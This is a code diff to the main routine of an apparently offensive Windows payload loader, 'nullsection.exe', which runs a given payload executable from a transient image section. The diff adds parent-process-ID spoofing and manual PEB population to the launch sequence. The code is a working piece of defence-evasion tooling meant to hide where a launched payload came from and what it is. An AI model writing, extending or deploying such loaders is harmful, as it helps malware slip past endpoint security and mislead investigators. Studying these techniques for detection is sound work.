@@ -31,7 +31,8 @@ int main(int argc, char *argv[]) {
   PrintBanner();
 
   if (argc < 2) {
-    std::cout << "Usage: nullsection.exe run --image <payload.exe>"
+    std::cout << "Usage: nullsection.exe run --image <payload.exe> "
+                 "[--manual-peb] [--ppid <pid>]"
               << std::endl;
     return 1;
   }
@@ -39,11 +40,18 @@ int main(int argc, char *argv[]) {
   std::string command = argv[1];
   if (command == "run") {
     std::wstring imagePath;
+    bool manualPeb = false;
+    DWORD ppid = 0;
+
     for (int i = 2; i < argc; ++i) {
       std::string arg = argv[i];
       if (arg == "--image" && i + 1 < argc) {
         std::string pathStr = argv[++i];
         imagePath = std::wstring(pathStr.begin(), pathStr.end());
+      } else if (arg == "--manual-peb") {
+        manualPeb = true;
+      } else if (arg == "--ppid" && i + 1 < argc) {
+        ppid = std::stoul(argv[++i]);
       }
     }
 
@@ -80,53 +88,59 @@ int main(int argc, char *argv[]) {
           headers->nt_headers->OptionalHeader.AddressOfEntryPoint;
       utils::Logger::Log(utils::LogLevel::DEBUG, "Entry point RVA resolved.");
 
-      // 3. Create transient section
+      // 3. Handle PPID Spoofing
+      utils::Handle hParent;
+      if (ppid != 0) {
+        utils::Logger::Log(utils::LogLevel::INFO,
+                           "Spoofing Parent Process ID: " +
+                               std::to_string(ppid));
+        HANDLE hProc = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
+        if (!hProc)
+          throw utils::Win32Exception(
+              "Failed to open parent process for spoofing", GetLastError());
+        hParent.Reset(hProc);
+      }
+
+      // 4. Create transient section
       utils::Logger::Log(utils::LogLevel::INFO,
-                         "Creating transient section for: " +
-                             std::string(imagePath.begin(), imagePath.end()));
+                         "Creating transient section...");
       utils::Handle hSection =
           image::SectionBuilder::CreateTransientSection(imagePath);
-      utils::Logger::Log(utils::LogLevel::DEBUG,
-                         "Section created successfully.");
 
-      // 4. Create process from section
-      utils::Logger::Log(utils::LogLevel::INFO,
-                         "Creating process object via NtCreateProcessEx.");
+      // 5. Create process from section
+      utils::Logger::Log(utils::LogLevel::INFO, "Creating process object.");
       utils::Handle hProcess =
-          process::ProcessFactory::CreateProcessFromSection(hSection);
-      utils::Logger::Log(utils::LogLevel::DEBUG,
-                         "Process created successfully.");
+          process::ProcessFactory::CreateProcessFromSection(hSection, hParent);
 
-      // 5. Resolve absolute entry point
+      // 6. Manual PEB Population (Advanced Research)
+      if (manualPeb) {
+        utils::Logger::Log(utils::LogLevel::INFO,
+                           "Performing manual PEB population...");
+        PROCESS_BASIC_INFORMATION pbi;
+        NTSTATUS status = core::NtApi::Instance().NtQueryInformationProcess(
+            hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
+        if (status == 0) {
+          process::PebBuilder::PopulatePeb(hProcess, pbi.PebBaseAddress,
+                                           imagePath,
+                                           L"\"" + imagePath + L"\"");
+          utils::Logger::Log(utils::LogLevel::DEBUG,
+                             "Remote PEB populated manually.");
+        }
+      }
+
+      // 7. Resolve absolute entry point and Launch
       PVOID remoteBase = process::ProcessFactory::GetRemoteImageBase(hProcess);
       PVOID absoluteEntryPoint = (PBYTE)remoteBase + entryPointRva;
-      utils::Logger::Log(utils::LogLevel::INFO,
-                         "Resolved absolute entry point.");
 
-      // 6. Launch thread
-      utils::Logger::Log(utils::LogLevel::INFO,
-                         "Launching main thread via NtCreateThreadEx.");
+      utils::Logger::Log(utils::LogLevel::INFO, "Launching main thread.");
       utils::Handle hThread = process::ThreadLauncher::LaunchMainThread(
           hProcess, absoluteEntryPoint);
 
-      utils::Logger::Log(utils::LogLevel::INFO,
-                         "Execution successful. Process is running.");
+      utils::Logger::Log(utils::LogLevel::INFO, "Execution successful.");
 
-    } catch (const utils::NtException &e) {
-      utils::Logger::Log(utils::LogLevel::ERROR,
-                         std::string("NT API Error: ") + e.what());
-      return 1;
-    } catch (const utils::Win32Exception &e) {
-      utils::Logger::Log(utils::LogLevel::ERROR,
-                         std::string("Win32 Error: ") + e.what());
-      return 1;
-    } catch (const utils::NullSectionException &e) {
-      utils::Logger::Log(utils::LogLevel::ERROR,
-                         std::string("Framework Error: ") + e.what());
-      return 1;
     } catch (const std::exception &e) {
       utils::Logger::Log(utils::LogLevel::ERROR,
-                         std::string("Unexpected error: ") + e.what());
+                         std::string("Execution failed: ") + e.what());
       return 1;
     }
   } else {
